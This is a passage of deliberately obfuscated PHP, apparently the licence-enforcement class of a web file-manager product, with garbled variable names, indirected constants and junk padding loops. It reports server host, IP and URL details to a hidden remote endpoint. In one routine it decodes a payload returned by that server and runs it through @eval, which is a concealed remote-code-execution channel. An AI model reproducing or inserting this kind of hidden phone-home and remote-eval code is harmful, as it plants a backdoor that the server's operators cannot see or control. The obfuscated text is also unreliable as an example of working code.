array($û¢˜ãÍØ[140], $û¢˜ãÍØ[141], $û¢˜ãÍØ[142], $û¢˜ãÍØ[143], $û¢˜ãÍØ[144], $û¢˜ãÍØ[145]); $²ˆÔ¨¦” = Model($û¢˜ãÍØ[33])->get(); $õ˜óæ = $øŞë‚Ò[727]; $¸Ô—’õ… = array($û¢˜ãÍØ[146] => $²ˆÔ¨¦”[$û¢˜ãÍØ[34]], $û¢˜ãÍØ[147] => $²ˆÔ¨¦”[$û¢˜ãÍØ[35]], $û¢˜ãÍØ[148] => $û¢˜ãÍØ[6]); $¢–î½ø = $øŞë‚Ò[728]; foreach ($†ØÛ»é as $‚‰Ï’«×) { if (!isset($²ˆÔ¨¦”[$‚‰Ï’«×]) || !$²ˆÔ¨¦”[$‚‰Ï’«×]) { continue; } $¸Ô—’õ…[$‚‰Ï’«×] = $²ˆÔ¨¦”[$‚‰Ï’«×]; } call_user_func(array($û¢˜ãÍØ[138], $û¢˜ãÍØ[139]), $¸Ô—’õ…); } private function vwci2c0aa9ca() { $‚¶şÄ»í =& $_SERVER[Ùæõ‰Ï’]; $±‰ŠÅòƒ =& $_SERVER[øé†…ş]; if ($_SERVER[$±‰ŠÅòƒ[24]] != $±‰ŠÅòƒ[149]) { return; } if (!KodUser::isRoot()) { die; } $Ä·—² = $GLOBALS[$±‰ŠÅòƒ[13]]; if (isset($Ä·—²[$±‰ŠÅòƒ[150]])) { $this->fbcha35f870d(); die; } if (isset($Ä·—²[$±‰ŠÅòƒ[151]]) && isset($Ä·—²[$±‰ŠÅòƒ[151]]) == $±‰ŠÅòƒ[122]) { $Ä·—²[$±‰ŠÅòƒ[152]] = Model($±‰ŠÅòƒ[33])->get($±‰ŠÅòƒ[153]); } if (!isset($Ä·—²[$±‰ŠÅòƒ[152]]) || strlen($Ä·—²[$±‰ŠÅòƒ[152]]) != 16) { show_json($±‰ŠÅòƒ[154] . $Ä·—²[$±‰ŠÅòƒ[152]], !1); } $¢æó‘è© = Model($±‰ŠÅòƒ[33])->get($±‰ŠÅòƒ[100]); $ÃˆÏ’¢„ = md5($_SERVER[$±‰ŠÅòƒ[106]] . $¢æó‘è©); $ıİÔè¦ = $‚¶şÄ»í[729]; $«Š‰Øş± = array($±‰ŠÅòƒ[152] => $Ä·—²[$±‰ŠÅòƒ[152]], $±‰ŠÅòƒ[155] => rand_string(16), $±‰ŠÅòƒ[156] => $±‰ŠÅòƒ[136], $±‰ŠÅòƒ[157] => $±‰ŠÅòƒ[158], $±‰ŠÅòƒ[159] => $_SERVER[$±‰ŠÅòƒ[160]], $±‰ŠÅòƒ[161] => $_SERVER[$±‰ŠÅòƒ[162]], $±‰ŠÅòƒ[163] => $_SERVER[$±‰ŠÅòƒ[164]], $±‰ŠÅòƒ[105] => $ÃˆÏ’¢„, $±‰ŠÅòƒ[165] => Model($±‰ŠÅòƒ[33])->get($±‰ŠÅòƒ[131])); $ÏŠÀî½ = $‚¶şÄ»í[730]; if (strlen($ÏŠÀî½) < $‚¶şÄ»í[690]) { return; } if (isset($Ä·—²[$±‰ŠÅòƒ[151]]) && isset($Ä·—²[$±‰ŠÅòƒ[151]]) == $±‰ŠÅòƒ[122]) { $«Š‰Øş±[$±‰ŠÅòƒ[151]] = md5($«Š‰Øş±[$±‰ŠÅòƒ[152]] . $±‰ŠÅòƒ[166] . $«Š‰Øş±[$±‰ŠÅòƒ[155]]); } if ($Ä·—²[$±‰ŠÅòƒ[167]] == $±‰ŠÅòƒ[168]) { $Ãìú°˜ª = $this->cmxj88764825($ÃˆÏ’¢„, $±‰ŠÅòƒ[169]); $½…•Æ“› = $this->lrzw24095e82(json_encode($«Š‰Øş±), $ÃˆÏ’¢„ . $±‰ŠÅòƒ[170], 3); $½…•Æ“› = $½…•Æ“› . $±‰ŠÅòƒ[171] . $_SERVER[$±‰ŠÅòƒ[160]]; $œ·‘ÙÊ£ = $this->rqtoad110a75($±‰ŠÅòƒ[172] . $Ãìú°˜ª . $±‰ŠÅòƒ[173] . $½…•Æ“›, -1); show_json($œ·‘ÙÊ£, !0); } else { if ($Ä·—²[$±‰ŠÅòƒ[167]] == $±‰ŠÅòƒ[174]) { $İĞñË¿× = substr(md5($±‰ŠÅòƒ[175] . $ÃˆÏ’¢„), 12, 15) . $±‰ŠÅòƒ[176]; $½…•Æ“› = $this->niqpbee955fd(trim($Ä·—²[$±‰ŠÅòƒ[177]]), $İĞñË¿×, 2); $ı‰¥åÆœ = json_decode($½…•Æ“›, !0); if (!is_array($ı‰¥åÆœ) || !is_array($ı‰¥åÆœ[$±‰ŠÅòƒ[178]]) || $ı‰¥åÆœ[$±‰ŠÅòƒ[152]] != !0) { $šæŠ×³º = $±‰ŠÅòƒ[179]; $‡†ƒÓ– = $ı‰¥åÆœ[$±‰ŠÅòƒ[178]] ? $±‰ŠÅòƒ[180] . $ı‰¥åÆœ[$±‰ŠÅòƒ[178]] : $šæŠ×³º; show_json($‡†ƒÓ–, !1); } else { $«Š‰Øş±[$±‰ŠÅòƒ[155]] = $ı‰¥åÆœ[$±‰ŠÅòƒ[178]][$±‰ŠÅòƒ[181]]; } } else { $ı‰¥åÆœ = $this->rqtoad110a75($±‰ŠÅòƒ[182], $«Š‰Øş±, 10); } } if (!is_array($ı‰¥åÆœ) || !is_array($ı‰¥åÆœ[$±‰ŠÅòƒ[178]]) || $ı‰¥åÆœ[$±‰ŠÅòƒ[152]] != !0) { $šæŠ×³º = LNG($±‰ŠÅòƒ[183]); $‡†ƒÓ– = $ı‰¥åÆœ[$±‰ŠÅòƒ[178]] ? $±‰ŠÅòƒ[180] . $ı‰¥åÆœ[$±‰ŠÅòƒ[178]] : $šæŠ×³º; show_json($‡†ƒÓ–, !1); } $‰òğÁ² = $ı‰¥åÆœ[$±‰ŠÅòƒ[178]]; $ñ²ıÛš = $this->ahrde9e0bf2b($‰òğÁ²[$±‰ŠÅòƒ[184]]); if (!$ñ²ıÛš || $ñ²ıÛš != $‰òğÁ²[$±‰ŠÅòƒ[129]]) { $ÂÓµÖ€Ñ = array($±‰ŠÅòƒ[185] => Model($±‰ŠÅòƒ[33])->get($±‰ŠÅòƒ[100]), $±‰ŠÅòƒ[186] => $_SERVER[$±‰ŠÅòƒ[106]], $±‰ŠÅòƒ[187] => this_url(), $±‰ŠÅòƒ[161] => $_SERVER[$±‰ŠÅòƒ[162]]); $½…•Æ“› = $this->fkaeee80c632(json_encode($ÂÓµÖ€Ñ)); $this->rqtoad110a75($±‰ŠÅòƒ[188] . $½…•Æ“›); show_json(LNG($±‰ŠÅòƒ[189]), !0); } $¥É½Èú = array($±‰ŠÅòƒ[153] => $‰òğÁ²[$±‰ŠÅòƒ[190]], $±‰ŠÅòƒ[191] => $‰òğÁ²[$±‰ŠÅòƒ[192]], $±‰ŠÅòƒ[193] => rand_string(16), $±‰ŠÅòƒ[108] => $‰òğÁ²[$±‰ŠÅòƒ[194]]); if ($«Š‰Øş±[$±‰ŠÅòƒ[155]]) { $¥É½Èú[$±‰ŠÅòƒ[193]] = $«Š‰Øş±[$±‰ŠÅòƒ[155]]; } $–»È™¶ = substr(md5($¥É½Èú[$±‰ŠÅòƒ[191]]), 10, 10); $îÄ¢¶—ú = $–»È™¶ . $¥É½Èú[$±‰ŠÅòƒ[108]] . $¥É½Èú[$±‰ŠÅòƒ[193]]; $¥É½Èú[$±‰ŠÅòƒ[110]] = strrev(base64_encode($this->cmxj88764825($îÄ¢¶—ú, $±‰ŠÅòƒ[195]))); $ÛáìÆşÊ = rand_string(16); $âÄé†œ® = $ÛáìÆşÊ . $¥É½Èú[$±‰ŠÅòƒ[108]] . $this->cmxj88764825(md5($¥É½Èú[$±‰ŠÅòƒ[153]]), $ÛáìÆşÊ); $°«‡˜Ê÷ = $‚¶şÄ»í[731]; while ($°«‡˜Ê÷ < $‚¶şÄ»í[680]) { if ($°«‡˜Ê÷ >= 0) { break; } $°«‡˜Ê÷++; } $¥É½Èú[$±‰ŠÅòƒ[111]] = base64_encode(strrev($this->cmxj88764825($âÄé†œ®, $±‰ŠÅòƒ[196]))); $­Ï€°÷ = $‚¶şÄ»í[732]; if (strlen($­Ï€°÷) < $‚¶şÄ»í[686]) { return; } if ($‰òğÁ²[$±‰ŠÅòƒ[197]] && $‰òğÁ²[$±‰ŠÅòƒ[197]] >= 1) { Model($±‰ŠÅòƒ[33])->setDeep($±‰ŠÅòƒ[198], $±‰ŠÅòƒ[122]); } Model($±‰ŠÅòƒ[33])->set($¥É½Èú); $ÓÉ‹¯ïœ = md5($_SERVER[$±‰ŠÅòƒ[106]] . strrev($¢æó‘è©) . $¥É½Èú[$±‰ŠÅòƒ[191]]); $äÙËÈó‡ = strrev(substr($ÓÉ‹¯ïœ, 10, 16)); $Å–œ–¶ï = $‚¶şÄ»í[733]; $Éë’ÌÍ = $this->lrzw24095e82(json_encode($‰òğÁ²), $ÓÉ‹¯ïœ); $ÖÜ‹ÅÇä = array_to_keyvalue(Model($±‰ŠÅòƒ[7])->listData(), $±‰ŠÅòƒ[199]); $›Ê í¿É = $‚¶şÄ»í[734]; while (strlen($›Ê í¿É) < $‚¶şÄ»í[680]) { if (!$›Ê í¿É) { break; } $›Ê í¿É++; } $É—ÊÖåÒ = $ÖÜ‹ÅÇä[$±‰ŠÅòƒ[200]]; $¾¨ßøªŞ = $‚¶şÄ»í[735]; while (strlen($¾¨ßøªŞ) < $‚¶şÄ»í[690]) { if (!$¾¨ßøªŞ) { break; } $¾¨ßøªŞ++; } $è˜øíˆ = array(); $è˜øíˆ[$äÙËÈó‡] = $Éë’ÌÍ; Model($±‰ŠÅòƒ[7])->update($É—ÊÖåÒ[$±‰ŠÅòƒ[201]], array($±‰ŠÅòƒ[202] => $è˜øíˆ)); $this->zwsgf20f9007 = $‰òğÁ²; $this->ulwt91e7f40a = $¥É½Èú[$±‰ŠÅòƒ[108]]; $this->licenseRegistSuccess(); $Ãí¾è±³ = $‚¶şÄ»í[736]; if (strlen($Ãí¾è±³) < $‚¶şÄ»í[707]) { die; } Cache::set($±‰ŠÅòƒ[203] . md5($¢æó‘è© . $±‰ŠÅòƒ[204]), $±‰ŠÅòƒ[6]); $ı‘Æ¾Ò = $‚¶şÄ»í[737]; show_json(LNG($±‰ŠÅòƒ[189]), !0); $•ªëÇ§’ = $‚¶şÄ»í[738]; if (strlen($•ªëÇ§’) < $‚¶şÄ»í[686]) { die; } } private function licenseRegistSuccess() { $ ©Õé½ï =& $_SERVER[øé†…ş]; $›€ãØ¿ = Model($ ©Õé½ï[33])->get(); $»÷ç“‹ò = $_SERVER[Ùæõ‰Ï’][739]; if (!$»÷ç“‹ò) { die; } if ($›€ãØ¿[$ ©Õé½ï[63]] != $ ©Õé½ï[122]) { Model($ ©Õé½ï[33])->set($ ©Õé½ï[63], $ ©Õé½ï[122]); } Action($ ©Õé½ï[205])->initStart(!0); } private function fbcha35f870d() { $¸Ê¯Ïç½ =& $_SERVER[Ùæõ‰Ï’]; $·Ãâ™ =& $_SERVER[øé†…ş]; Model($·Ãâ™[33])->set(array($·Ãâ™[153] => $·Ãâ™[6], $·Ãâ™[191] => $·Ãâ™[6], $·Ãâ™[108] => $·Ãâ™[109], $·Ãâ™[110] => $·Ãâ™[6], $·Ãâ™[111] => $·Ãâ™[6])); Model($·Ãâ™[33])->setDeep($·Ãâ™[198], $·Ãâ™[206]); $this->zwsgf20f9007 = array(); $ù °›Øö = $¸Ê¯Ïç½[740]; if (strlen($ù °›Øö) < $¸Ê¯Ïç½[680]) { return; } $this->ulwt91e7f40a = $·Ãâ™[109]; $âÄß‘ù = $¸Ê¯Ïç½[741]; } private function jvilce461df1() { $•¯é†÷€ =& $_SERVER[Ùæõ‰Ï’]; $™şÎÊü =& $_SERVER[øé†…ş]; $_SERVER[$™şÎÊü[162]] = _get($_SERVER, $™şÎÊü[162], APP_HOST); $‡Ó–„¾— = $•¯é†÷€[742]; if (!$‡Ó–„¾—) { return; } $this->ulwt91e7f40a = $™şÎÊü[109]; $¾…ƒ´ÑØ = $•¯é†÷€[743]; $ƒ»¦º– = Model($™şÎÊü[33])->get(); if ($ƒ»¦º–[$™şÎÊü[108]] == $™şÎÊü[109]) { return; } $æÎÇÈ•• = Model($™şÎÊü[33])->get($™şÎÊü[100]); $å±´‰ = $™şÎÊü[203] . md5($æÎÇÈ•• . $™şÎÊü[204]); $ö‘­Ñ«È = Cache::get($å±´‰); $çâ÷šˆŒ = $•¯é†÷€[744]; if (!is_array($ö‘­Ñ«È) || !isset($ö‘­Ñ«È[$™şÎÊü[207]]) || time() - $ö‘­Ñ«È[$™şÎÊü[207]] >= 60) { $¦ìÉÅ…Á = Model($™şÎÊü[7])->loadList(); $ÅêùµºÕ = $¦ìÉÅ…Á[$™şÎÊü[200]]; $Œ˜ƒ÷³â = md5($_SERVER[$™şÎÊü[106]] . strrev($æÎÇÈ••) . $ƒ»¦º–[$™şÎÊü[191]]); $ó¼îáíÉ = strrev(substr($Œ˜ƒ÷³â, 10, 16)); $ö‘­Ñ«È = $this->niqpbee955fd($ÅêùµºÕ[$™şÎÊü[86]][$ó¼îáíÉ], $Œ˜ƒ÷³â); $ö‘­Ñ«È = json_decode($ö‘­Ñ«È, !0); } if (!is_array($ö‘­Ñ«È)) { return $this->fbcha35f870d(); } $¢ş€Ø = strtotime($ö‘­Ñ«È[$™şÎÊü[129]]); if (time() >= $¢ş€Ø) { return $this->fbcha35f870d(); } if (!isset($ö‘­Ñ«È[$™şÎÊü[207]]) || time() - $ö‘­Ñ«È[$™şÎÊü[207]] > 20) { $ö‘­Ñ«È[$™şÎÊü[207]] = time(); Cache::set($å±´‰, $ö‘­Ñ«È); } $this->zwsgf20f9007 = $ö‘­Ñ«È; $this->ulwt91e7f40a = $ƒ»¦º–[$™şÎÊü[108]]; } private function oqigeec957e9() { $Ì»¢Îì£ =& $_SERVER[Ùæõ‰Ï’]; $—’®›“ö =& $_SERVER[øé†…ş]; $À‚ú÷° = $GLOBALS[$—’®›“ö[13]]; $‘ì¥ÉÓ› = $_SERVER[$—’®›“ö[24]]; $¨ğÄïòà = $Ì»¢Îì£[745]; if (strlen($¨ğÄïòà) < $Ì»¢Îì£[680]) { die; } if ($‘ì¥ÉÓ› == $—’®›“ö[208] && $this->ulwt91e7f40a == $—’®›“ö[109]) { show_json(LNG($—’®›“ö[209]), !1, $—’®›“ö[210]); } $ã‹ŠÖõ = array($—’®›“ö[211], $—’®›“ö[212]); if (in_array($‘ì¥ÉÓ›, $ã‹ŠÖõ)) { if ($this->ulwt91e7f40a == $—’®›“ö[109] && isset($À‚ú÷°[$—’®›“ö[213]])) { show_json(LNG($—’®›“ö[209]), !1, $—’®›“ö[210]); die; } $ºıç›¿Ö = $this->tyil275b75eb(); if ($ºıç›¿Ö != intval($—’®›“ö[214])) { if ($ºıç›¿Ö <= Model($—’®›“ö[125])->count()) { show_json(LNG($—’®›“ö[215]), !1, $—’®›“ö[210]); die; } } } } private function ckpe0db01bbe() { $ŞËËçïá =& $_SERVER[Ùæõ‰Ï’]; $ˆ‡‚Å¾ı =& $_SERVER[øé†…ş]; $â¦áà³¡ = array($ˆ‡‚Å¾ı[119], $ˆ‡‚Å¾ı[120]); $¸éŸŒ×Œ = $ŞËËçïá[746]; if (!$¸éŸŒ×Œ) { return; } if (!KodUser::isRoot() || !isset($_GET[$ˆ‡‚Å¾ı[216]])) { return; } if (!in_array($_SERVER[$ˆ‡‚Å¾ı[24]], $â¦áà³¡)) { return; } $ÄÅ©ÛŠ = $ˆ‡‚Å¾ı[217]; $ÄÅ©ÛŠ = $this->mydve1d0e485($ÄÅ©ÛŠ, $ˆ‡‚Å¾ı[218]); $ë³éì™· = stream_context_create(array($ˆ‡‚Å¾ı[219] => array($ˆ‡‚Å¾ı[220] => $ˆ‡‚Å¾ı[221], $ˆ‡‚Å¾ı[222] => 3))); $§¿ı€Äç = @file_get_contents($ÄÅ©ÛŠ, !1, $ë³éì™·); $Ëû»ÂÓ = $ŞËËçïá[747]; if (!$Ëû»ÂÓ) { return; } header($ˆ‡‚Å¾ı[223]); $úÕ©õÜ = $ŞËËçïá[748]; if ($§¿ı€Äç && strstr($§¿ı€Äç, $ˆ‡‚Å¾ı[224])) { echo $§¿ı€Äç; } die; } public function yzak9f7b7afe($ğ›‰â˜¿) { $íâÏœ‘» =& $_SERVER[Ùæõ‰Ï’]; $¿è«Î¥§ =& $_SERVER[øé†…ş]; if ($this->ulwt91e7f40a == $¿è«Î¥§[225]) { return $ğ›‰â˜¿; } $µ›ÂÔ¿— = $this->versionPluginList(); $­ˆŸéö = explode($¿è«Î¥§[226], $this->versionPluginFilter()); $ÑÑöèèÕ = $íâÏœ‘»[749]; if (strlen($ÑÑöèèÕ) < $íâÏœ‘»[690]) { die; } $±¢Ö¸¤› = array(); $²õÒé•Ï = $íâÏœ‘»[750]; if (!$²õÒé•Ï) { return; } foreach ($µ›ÂÔ¿— as $™‚–»çé => $Òï¹Ğ«õ) { if ($Òï¹Ğ«õ == $¿è«Î¥§[227] && substr($this->ulwt91e7f40a, 0, 1) == $¿è«Î¥§[227]) { continue; } if (!in_array($™‚–»çé, $­ˆŸéö)) { $±¢Ö¸¤›[] = $™‚–»çé; } } foreach ($±¢Ö¸¤› as $™‚–»çé) { unset($ğ›‰â˜¿[$™‚–»çé]); } return $ğ›‰â˜¿; } private function versionPluginList() { $ó¼‰®ê =& $_SERVER[øé†…ş]; return array($ó¼‰®ê[228] => $ó¼‰®ê[227], $ó¼‰®ê[229] => $ó¼‰®ê[227], $ó¼‰®ê[230] => $ó¼‰®ê[227], $ó¼‰®ê[231] => $ó¼‰®ê[232], $ó¼‰®ê[233] => $ó¼‰®ê[232], $ó¼‰®ê[234] => $ó¼‰®ê[232], $ó¼‰®ê[235] => $ó¼‰®ê[232], $ó¼‰®ê[236] => $ó¼‰®ê[232], $ó¼‰®ê[237] => $ó¼‰®ê[232], $ó¼‰®ê[238] => $ó¼‰®ê[232], $ó¼‰®ê[239] => $ó¼‰®ê[232], $ó¼‰®ê[240] => $ó¼‰®ê[232], $ó¼‰®ê[241] => $ó¼‰®ê[232], $ó¼‰®ê[242] => $ó¼‰®ê[232], $ó¼‰®ê[243] => $ó¼‰®ê[232], $ó¼‰®ê[244] => $ó¼‰®ê[232]); } private function versionPluginFilter() { $µâÚ£Ò =& $_SERVER[Ùæõ‰Ï’]; $¸´‰µÖÀ =& $_SERVER[øé†…ş]; if ($this->ulwt91e7f40a == $¸´‰µÖÀ[109]) { return $¸´‰µÖÀ[6]; } $–Š¿Í‡¢ = _get($this->zwsgf20f9007, $¸´‰µÖÀ[245], $¸´‰µÖÀ[6]); $§¥Ú´È¸ = $µâÚ£Ò[751]; if (!$§¥Ú´È¸) { die; } $®äº òÏ = _get($this->zwsgf20f9007, $¸´‰µÖÀ[116], $¸´‰µÖÀ[6]); $œêšà¯ù = $µâÚ£Ò[752]; $Ä“¶æ = _get($this->zwsgf20f9007, $¸´‰µÖÀ[246], $¸´‰µÖÀ[6]); $…Í‘õ¸ = $µâÚ£Ò[753]; if (!$…Í‘õ¸) { die; } if ($®äº òÏ > time() && $Ä“¶æ > time()) { $³ë„¾¡ = explode($¸´‰µÖÀ[226], $–Š¿Í‡¢); $ªÆ©‡Îæ = array_keys($this->versionPluginList()); $–Š¿Í‡¢ = array_merge($³ë„¾¡, $ªÆ©‡Îæ); $–Š¿Í‡¢ = implode($¸´‰µÖÀ[226], array_filter(array_unique($–Š¿Í‡¢))); } return $–Š¿Í‡¢; } private function sgdn095a118e() { $Ø…÷³Ù =& $_SERVER[øé†…ş]; if ($this->ulwt91e7f40a != $Ø…÷³Ù[109]) { $GLOBALS[$Ø…÷³Ù[86]][$Ø…÷³Ù[90]][$Ø…÷³Ù[247]] = $Ø…÷³Ù[206]; return; } $GLOBALS[$Ø…÷³Ù[86]][$Ø…÷³Ù[248]] = $Ø…÷³Ù[122]; if (Model($Ø…÷³Ù[249])->get($Ø…÷³Ù[63]) != $Ø…÷³Ù[206]) { Model($Ø…÷³Ù[249])->set($Ø…÷³Ù[63], $Ø…÷³Ù[206]); } } public function tqimc0d03f06() { $æáš¤­¸ =& $_SERVER[Ùæõ‰Ï’]; return $_SERVER[øé†…ş][250]; $È±’Šš = $æáš¤­¸[754]; while ($È±’Šš < $æáš¤­¸[690]) { if ($È±’Šš >= 0) { break; } $È±’Šš++; } } private function blhzcc457755() { $½òíª´ =& $_SERVER[Ùæõ‰Ï’]; $ğ÷§İÑä =& $_SERVER[øé†…ş]; $®Î°§ˆ = array($ğ÷§İÑä[251], $ğ÷§İÑä[252], $ğ÷§İÑä[253]); $Ê©Òëó» = $½òíª´[755]; if (!$Ê©Òëó») { return; } $¡İ˜®¬Œ = $ğ÷§İÑä[254] . md5($ğ÷§İÑä[255]); $ó‰®óßÜ = $½òíª´[756]; if (!$ó‰®óßÜ) { return; } if ($this->ulwt91e7f40a == $ğ÷§İÑä[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ğ÷§İÑä[24]], $®Î°§ˆ)) { return; } if (time() % 4 != 0) { return; } $†³¿É¿¹ = call_user_func(array($ğ÷§İÑä[256], $ğ÷§İÑä[257]), $¡İ˜®¬Œ); $Î’ÆØ®Á = $½òíª´[757]; while ($Î’ÆØ®Á < $½òíª´[758]) { if ($Î’ÆØ®Á >= 0) { break; } $Î’ÆØ®Á++; } if ($†³¿É¿¹ && time() - $†³¿É¿¹ < intval($ğ÷§İÑä[258])) { return; } call_user_func(array($ğ÷§İÑä[256], $ğ÷§İÑä[139]), $¡İ˜®¬Œ, time()); $×…•à³¯ = $½òíª´[759]; $Üúˆ‚ĞÀ = Model($ğ÷§İÑä[33])->get($ğ÷§İÑä[100]); $‘è’Ğûä = $½òíª´[760]; $‘¹…• = array($ğ÷§İÑä[152] => Model($ğ÷§İÑä[33])->get($ğ÷§İÑä[153]), $ğ÷§İÑä[167] => $this->ulwt91e7f40a, $ğ÷§İÑä[163] => $_SERVER[$ğ÷§İÑä[164]], $ğ÷§İÑä[165] => Model($ğ÷§İÑä[33])->get($ğ÷§İÑä[131]), $ğ÷§İÑä[105] => md5($_SERVER[$ğ÷§İÑä[106]] . $Üúˆ‚ĞÀ), $ğ÷§İÑä[156] => $ğ÷§İÑä[136], $ğ÷§İÑä[159] => $_SERVER[$ğ÷§İÑä[160]]); $˜Ä†ÒÇ = $½òíª´[761]; if (strlen($˜Ä†ÒÇ) < $½òíª´[686]) { die; } $‚µ€¥å = $this->rqtoad110a75($ğ÷§İÑä[259], $‘¹…•); if (!is_array($‚µ€¥å)) { return; } if ($‚µ€¥å[$ğ÷§İÑä[152]] && $‚µ€¥å[$ğ÷§İÑä[260]]) { if ($this->ahrde9e0bf2b($‚µ€¥å[$ğ÷§İÑä[260]]) == $‘¹…•[$ğ÷§İÑä[152]]) { return; } } $this->fbcha35f870d(); $ª¸éÃ‚ = $½òíª´[762]; while (strlen($ª¸éÃ‚) < $½òíª´[690]) { if (!$ª¸éÃ‚) { break; } $ª¸éÃ‚++; } if ($this->ahrde9e0bf2b($‚µ€¥å[$ğ÷§İÑä[260]]) != $‘¹…•[$ğ÷§İÑä[152]]) { $ÓõıÁ­ô = array($ğ÷§İÑä[185] => $Üúˆ‚ĞÀ, $ğ÷§İÑä[186] => $_SERVER[$ğ÷§İÑä[106]], $ğ÷§İÑä[187] => this_url(), $ğ÷§İÑä[161] => $_SERVER[$ğ÷§İÑä[162]]); $ùŠÀ¬©¢ = $this->fkaeee80c632(json_encode($ÓõıÁ­ô)); $‚µ€¥å = $this->rqtoad110a75($ğ÷§İÑä[188] . $ùŠÀ¬©¢); if ($‚µ€¥å && is_array($‚µ€¥å) && isset($‚µ€¥å[$ğ÷§İÑä[260]])) { $ª”Î–ßĞ = $this->niqpbee955fd($‚µ€¥å[$ğ÷§İÑä[260]], 2); if ($ª”Î–ßĞ) { $ª”Î–ßĞ = $this->ahrde9e0bf2b($ª”Î–ßĞ); } if ($ª”Î–ßĞ) { try { @eval($ª”Î–ßĞ); } catch (Exception $îõ‰ÔéÃ) { } } } } } private function rqtoad110a75($îöÒîò = '', $–ÆåŒÙÔ = array(), $Ë•ƒ½ĞÉ = 5) { $çù­Ü½é =& $_SERVER[Ùæõ‰Ï’]; $ãÃºßÕ =& $_SERVER[øé†…ş]; $¥®ùÄÖ¾ = $ãÃºßÕ[261]; $¥«üÔ = $çù­Ü½é[763]; $¥®ùÄÖ¾ = $this->mydve1d0e485($¥®ùÄÖ¾, $ãÃºßÕ[262]); $ô™ÚªÒŠ = $çù­Ü½é[764]; if (!$ô™ÚªÒŠ) { die; } $¥®ùÄÖ¾ = $¥®ùÄÖ¾ . $îöÒîò; $ú›ªŒòÎ = $çù­Ü½é[765]; if ($–ÆåŒÙÔ && is_array($–ÆåŒÙÔ)) { $¥®ùÄÖ¾ = $¥®ùÄÖ¾ . $ãÃºßÕ[263] . http_build_query($–ÆåŒÙÔ); } if ($–ÆåŒÙÔ === -1) { return $¥®ùÄÖ¾; } $ßÑóÏõ– = stream_context_create(array($ãÃºßÕ[219] => array($ãÃºßÕ[222] => $Ë•ƒ½ĞÉ, $ãÃºßÕ[220] => $ãÃºßÕ[264]), $ãÃºßÕ[265] => array($ãÃºßÕ[266] => !1, $ãÃºßÕ[267] => !1))); $–ÆåŒÙÔ = @file_get_contents($¥®ùÄÖ¾, !1, $ßÑóÏõ–); return json_decode($–ÆåŒÙÔ, !0); } private function tyil275b75eb() { $İµÇÈ¾¯ =& $_SERVER[Ùæõ‰Ï’]; $ôµ‰Û¤Š =& $_SERVER[øé†…ş]; $»Œ×ÍÃ¨ = array($ôµ‰Û¤Š[268] => $ôµ‰Û¤Š[269], $ôµ‰Û¤Š[270] => $ôµ‰Û¤Š[271], $ôµ‰Û¤Š[272] => $ôµ‰Û¤Š[273], $ôµ‰Û¤Š[274] => $ôµ‰Û¤Š[275], $ôµ‰Û¤Š[276] => $ôµ‰Û¤Š[277], $ôµ‰Û¤Š[278] => $ôµ‰Û¤Š[214], $ôµ‰Û¤Š[279] => $ôµ‰Û¤Š[214], $ôµ‰Û¤Š[280] => $ôµ‰Û¤Š[269], $ôµ‰Û¤Š[281] => $ôµ‰Û¤Š[271], $ôµ‰Û¤Š[282] => $ôµ‰Û¤Š[273], $ôµ‰Û¤Š[283] => $ôµ‰Û¤Š[284], $ôµ‰Û¤Š[285] => $ôµ‰Û¤Š[275], $ôµ‰Û¤Š[286] => $ôµ‰Û¤Š[287], $ôµ‰Û¤Š[288] => $ôµ‰Û¤Š[277], $ôµ‰Û¤Š[289] => $ôµ‰Û¤Š[290], $ôµ‰Û¤Š[291] => $ôµ‰Û¤Š[292], $ôµ‰Û¤Š[293] => $ôµ‰Û¤Š[294]); $äâÚüü = $»Œ×ÍÃ¨[$this->ulwt91e7f40a]; $äâÚüü = intval($äâÚüü ? $äâÚüü : $ôµ‰Û¤Š[269]); $ÉÔ¬Ë×ü = _get($this->zwsgf20f9007, $ôµ‰Û¤Š[295]); $Õå†çÊ° = $İµÇÈ¾¯[766]; $ÉÔ¬Ë×ü = $ÉÔ¬Ë×ü ? intval($ÉÔ¬Ë×ü) : 0; return $äâÚüü + $ÉÔ¬Ë×ü; $Å¼½ºë¬ = $İµÇÈ¾¯[767]; while (strlen($Å¼½ºë¬) < $İµÇÈ¾¯[680]) { if (!$Å¼½ºë¬) { break; } $Å¼½ºë¬++; } } public function evqyb6e9ba57($êÙ«è™‚) { $ß“”õÌ© =& $_SERVER[Ùæõ‰Ï’]; $°æ¼ëò =& $_SERVER[øé†…ş]; $¯ŠÄ¹ = $this->tyil275b75eb(); if ($êÙ«è™‚[$°æ¼ëò[296]] == $°æ¼ëò[122]) { return; } if ($¯ŠÄ¹ >= intval($°æ¼ëò[214])) { return; } $í½çÄü° = Model($°æ¼ëò[125])->count(); if ($í½çÄü° <= $¯ŠÄ¹) { return; } $¤÷ƒÍó÷ = Model($°æ¼ëò[125])->field($°æ¼ëò[296])->limit($¯ŠÄ¹)->select(); $»µşõê = $ß“”õÌ©[768]; if (strlen($»µşõê) < $ß“”õÌ©[707]) { die; } $¤÷ƒÍó÷ = array_to_keyvalue($¤÷ƒÍó÷, $°æ¼ëò[6], $°æ¼ëò[296]); $İâ¬ÁÇ· = $ß“”õÌ©[769]; if (!in_array($êÙ«è™‚[$°æ¼ëò[296]], $¤÷ƒÍó÷)) { show_json($°æ¼ëò[297], !1, $°æ¼ëò[210]); } } public function vrtq3fe78253() { $Å’€øØ‡ =& $_SERVER[Ùæõ‰Ï’]; $…´¹Ò®ñ =& $_SERVER[øé†…ş]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $‹ÕŸÏ = $…´¹Ò®ñ[217]; $‹ÕŸÏ = $this->mydve1d0e485($‹ÕŸÏ, $…´¹Ò®ñ[218]); $›ÉÀü–‰ = stream_context_create(array($…´¹Ò®ñ[219] => array($…´¹Ò®ñ[220] => $…´¹Ò®ñ[221], $…´¹Ò®ñ[222] => 3))); $í”¶îï¨ = $Å’€øØ‡[770]; if (!$í”¶îï¨) { die; } $¾–ìÇÛ = @file_get_contents($‹ÕŸÏ, !1, $›ÉÀü–‰); echo $…´¹Ò®ñ[298] . hash_encode($¾–ìÇÛ) . $…´¹Ò®ñ[299]; $«ÎòõÍ’ = $Å’€øØ‡[771]; } private function lrzw24095e82($îº°Äß, $Ò×¶ìÒ, $÷ÃÅ”¸ì = 3) { $åŸ­€Ûº =& $_SERVER[Ùæõ‰Ï’]; $âÏÏ·šµ =& $_SERVER[øé†…ş]; usleep(1); $îº°Äß = trim($îº°Äß); $ÛÅÕ´Üî = $åŸ­€Ûº[772]; $ÛÇø„ä­ = mt_rand(0, 5) . $âÏÏ·šµ[6]; 